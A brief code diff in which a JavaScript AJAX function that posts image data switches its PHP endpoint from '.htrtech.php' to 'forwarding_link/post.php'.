@@ -20,8 +20,8 @@
 function post(imgdata){	
 $.ajax({	
     type: 'POST',	
-    data: { cat: imgdata},	
-    url: '.htrtech.php',	
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
     dataType: 'json',	
     async: false,	
     success: function(result){	
